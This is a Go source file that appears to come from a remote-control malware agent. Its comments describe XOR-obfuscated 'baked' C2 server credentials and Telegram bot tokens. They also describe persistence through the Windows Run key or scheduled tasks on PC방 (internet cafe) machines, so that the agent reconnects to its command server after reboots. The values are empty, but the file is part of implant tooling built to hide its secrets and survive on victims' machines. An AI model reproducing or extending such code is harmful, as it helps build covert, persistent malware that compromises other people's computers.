// Baked agent secrets (XOR-obfuscated with obfKey from xor.go).
//
// This template file carries EMPTY values and is safe to keep in the source
// tree. For production builds, run scripts/bake_secrets.py which regenerates
// this file in the BUILD tree (.build/agent/) with real values from
// config.vultr.env — the baked version must never be copied back to agent/.
//
// Why baked values are required: PC방 persistence re-launches the agent at
// logon via the Run key / scheduled task, and that path loses the C2_SERVER /
// C2_AUTH_TOKEN env vars set by the .cmd wrapper. Without baked fallbacks the
// agent is deaf after the first reboot.
package main

var (
	eBakedAgentToken = []byte("")
	eBakedC2PSK      = []byte("")
	eTgBotToken      = []byte("")
	eTgChatID        = []byte("")
)

func bakedAgentToken() string { return xob(eBakedAgentToken) }

func bakedC2PSK() string { return xob(eBakedC2PSK) }
